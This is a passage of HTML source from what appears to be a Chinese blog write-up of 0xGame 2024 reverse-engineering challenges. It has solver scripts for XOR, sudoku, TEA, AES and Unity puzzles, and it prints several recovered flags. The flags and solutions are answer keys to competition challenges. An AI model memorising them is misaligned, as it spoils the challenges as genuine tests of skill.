class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">20</span>,<br>   <span class="hljs-number">92</span>,<br>   <span class="hljs-number">43</span>,<br>   <span class="hljs-number">69</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">95</span>,<br>   <span class="hljs-number">23</span>,<br>   <span class="hljs-number">72</span>,<br>   <span class="hljs-number">22</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">69</span>,<br>   <span class="hljs-number">25</span>,<br>   <span class="hljs-number">27</span>,<br>   <span class="hljs-number">22</span>,<br>   <span class="hljs-number">17</span>,<br>   <span class="hljs-number">23</span>,<br>   <span class="hljs-number">29</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">17</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">85</span>,<br>   <span class="hljs-number">27</span>,<br>   <span class="hljs-number">112</span>,<br>   <span class="hljs-number">76</span>,<br>   <span class="hljs-number">15</span>,<br>   <span class="hljs-number">92</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">1</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">84</span>,<br>   <span class="hljs-number">13</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">12</span>,<br>   <span class="hljs-number">0</span>,<br>   <span class="hljs-number">84</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">82</span>,<br>   <span class="hljs-number">8</span>,<br>   <span class="hljs-number">82</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">76</span>,<br>   <span class="hljs-number">125</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>    a[i]+=<span class="hljs-number">28</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>,<span class="hljs-number">43</span>):<br>    a[i]=a[i]^a[i-<span class="hljs-number">22</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><h3 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h3><p>9*9的数组，大概率是数独题</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729412469694-875ef68b-79a5-442c-99f0-aee73180c7be.png" class="" title="img"><p>手算比较麻烦，建议直接套模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 定义数独的9x9网格</span><br>board = [[<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>], <br>         [<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br><br><span class="hljs-comment"># 创建一个9x9的矩阵，存放Z3变量（每个格子一个变量）</span><br>X = [[Int(<span class="hljs-string">f&#x27;x_<span class="hljs-subst">&#123;i&#125;</span>_<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 约束1：所有变量取值范围在1到9之间</span><br>cells_c = [And(X[i][j] &gt;= <span class="hljs-number">1</span>, X[i][j] &lt;= <span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 约束2：每一行的数字不能重复</span><br>rows_c = [Distinct(X[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 约束3：每一列的数字不能重复</span><br>cols_c = [Distinct([X[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 约束4：每个3x3的子方格中的数字不能重复</span><br>squares_c = [Distinct([X[<span class="hljs-number">3</span> * i + di][<span class="hljs-number">3</span> * j + dj] <span class="hljs-keyword">for</span> di <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> dj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)])<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br><br><span class="hljs-comment"># 约束5：已知的棋盘数字需要保持不变</span><br>instance_c = [If(board[i][j] == <span class="hljs-number">0</span>, <span class="hljs-literal">True</span>, X[i][j] == board[i][j]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 创建求解器</span><br>solver = Solver()<br>solver.add(cells_c + rows_c + cols_c + squares_c + instance_c)<br><br><span class="hljs-comment"># 检查是否有解</span><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    result_board = [[model.evaluate(X[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>    <span class="hljs-comment"># 打印填充好的数独</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> result_board:<br>        <span class="hljs-built_in">print</span>(row)<br>    <br>    <span class="hljs-comment"># 将解转换为字符串形式，用于生成输入</span><br>    nextLine = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            <span class="hljs-keyword">if</span> board[i][j] == <span class="hljs-number">0</span>:<br>                nextLine += <span class="hljs-built_in">str</span>(model.evaluate(X[i][j]))<br>    <br>    <span class="hljs-built_in">print</span>(nextLine)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无解&quot;</span>)<br></code></pre></td></tr></table></figure><p>求出nextLine之后6个数字一组，10转16之后作为字符加到sb中输出</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729412596110-e7a06992-e113-49e1-a1ea-3beb46b8e120.png" class="" title="img"><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>一开始把密文前后交换，直接解密发现中间错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x61C88647</span>;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x85336dd3</span>,<span class="hljs-number">0x2a7a7c3b</span>,<span class="hljs-number">0x64306238</span>,<span class="hljs-number">0x36396434</span>,<span class="hljs-number">0x62336364</span>,<span class="hljs-number">0x38376533</span>,<span class="hljs-number">0x37323664</span>,<span class="hljs-number">0x33363463</span>,<span class="hljs-number">0xf8ee8ea2</span>,<span class="hljs-number">0xc9b65cce</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">10</span>; m += <span class="hljs-number">2</span>) &#123;<br>        sum = delta*(<span class="hljs-number">-32</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123; <br>            v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>            v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>            sum += delta;<br>        &#125; <br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729416171742-505968c8-1d6f-4fd3-bb2d-268b89e97ca4.png" class="" title="img"><p>调试发现之后前8位和最后8位进行了加密，也就是说中间24位不变</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729415989369-10df214f-88ae-4797-b4b8-19422074ea31.png" class="" title="img"><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span>xGame&#123;e<span class="hljs-number">8</span>b<span class="hljs-number">0</span>d<span class="hljs-number">4</span>d<span class="hljs-number">96</span>dc<span class="hljs-number">3</span>b<span class="hljs-number">3e78</span>d<span class="hljs-number">627</span><span class="hljs-keyword">c</span><span class="hljs-number">463</span><span class="hljs-keyword">c</span><span class="hljs-number">9953</span>a<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h3><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729425443383-310cd0ae-6ab1-434d-998a-935e18b07df9.png" class="" title="img"><p>直接搜索secret找到密文</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729425430116-ff7eb4b5-fc90-4746-9a40-f1385f16d0dd.png" class="" title="img"><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="PyPro"><a href="#PyPro" class="headerlink" title="PyPro"></a>PyPro</h3><p>python3.12无法完全反编译，要用pydas</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730000706978-1346bbf7-c59b-44b3-8385-c7d4ea99fa00.png" class="" title="img"><p>知道先aes_ecb再base64</p><p>cy好像解不了用脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-number">0x554B134A029DE539438BD18604BF114</span><br><br>key_bytes = key.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(key_bytes)<br><br>encrypted_data = <span class="hljs-string">&quot;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&quot;</span><br><br>encrypted_bytes = base64.b64decode(encrypted_data)<br><br><br>cipher = AES.new(key_bytes, AES.MODE_ECB)<br><br><span class="hljs-keyword">try</span>:<br>    decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">except</span> (ValueError, KeyError):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败或填充错误！&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现密钥是奇数位，15.5个字节，前面补一个0</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730112516529-b4f8be4f-7213-4180-a65c-ee257606463d.png" class="" title="img"><h3 id="tea2-0"><a href="#tea2-0" class="headerlink" title="tea2.0"></a>tea2.0</h3><p>main一个tea</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730009659874-e0e1d12a-5e41-43f6-83d6-5297bbdf6bf9.png" class="" title="img"><p>交叉引用密文发现有tls</p><p>发现也是一次tea，但是不用管直接动调获取最后的密文</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730009743215-4186c384-baf7-4673-8729-2e354d7a62e1.png" class="" title="img"><p>有个奇怪的点是明明密文有48位，为什么比较的时候只有44位</p><p>经过调试发现最后一轮的v1初始值是0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x61C88647</span>, sum = delta * (<span class="hljs-number">-64</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x4512</span>,<span class="hljs-number">0x9832</span>,<span class="hljs-number">0x5647</span>,<span class="hljs-number">0x6314</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xd04bb2c4</span>,<span class="hljs-number">0xa625cf11</span>,<span class="hljs-number">0x57686f2b</span>,<span class="hljs-number">0x3b181680</span>,<span class="hljs-number">0x6fc33f75</span>,<span class="hljs-number">0x1779b334</span>,<span class="hljs-number">0xd95ca4f6</span>,<span class="hljs-number">0xc1ca9fa2</span>,<span class="hljs-number">0x651a6aff</span>,<span class="hljs-number">0xc9ddba37</span>,<span class="hljs-number">0x3087d163</span>,<span class="hljs-number">0x187d7e10</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MineSweeper"><a href="#MineSweeper" class="headerlink" title="MineSweeper"></a>MineSweeper</h3><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018174056-78df7315-e2ec-4415-b4e0-c689ac0efa78.png" class="" title="img"><p>先是交换后面异或，另外从资源段加载密文</p><p><img src="/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020816792-e192a16f-38ca-4e43-8ad3-8a0491b7c428.png" alt="img"><img src="/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018488335-3249dd7b-11c3-4843-b40c-44b33fcfc766.png" alt="img"></p><p>haha就是KEY<img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018505000-f4806c5a-a2e2-430d-8189-23832fe07178.png" class="" title="img"></p><p>enc从resources.assets中加载</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020786128-746b332b-6ad5-4cfa-a05c-a0cd76e988bb.png" class="" title="img"><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020902049-3567b8d5-1bd1-410c-8373-8f93cb157a31.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">key=<span class="hljs-string">&#x27;0xoX0XOxOXoxGAME&#x27;</span><br>arr=[<span class="hljs-number">0x45</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x4B</span>,<br>     <span class="hljs-number">0x52</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x58</span>,<br>     <span class="hljs-number">0x15</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x1B</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x3C</span>]<br>num=<span class="hljs-number">0</span><br>s=<span class="hljs-string">&#x27;This is: True_KEY!for #0xgAmE_Unity~Cryption&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>KEY=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    KEY.append(<span class="hljs-built_in">ord</span>(s[i]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    num=(num+<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))%<span class="hljs-number">44</span><br>    KEY[i],KEY[num]=KEY[num],KEY[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    arr[i]^=KEY[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(arr[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#0xGame&#123;36ecd059-b3e7-73c8-fa80-0a2abef3c757&#125;</span><br></code></pre></td></tr></table></figure><h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><p>经过调试发现异或的数一直为6</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730026977143-927073b8-b730-4e18-80ad-d224acce30ea.png" class="" title="img"><p>问gpt发现是sha256</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730026874817-782bf294-e0f9-45c5-819b-73fcc46914e2.png" class="" title="img"><p>调试发现buf1就是输入的地址，也就是输入特定hash值即可</p><img 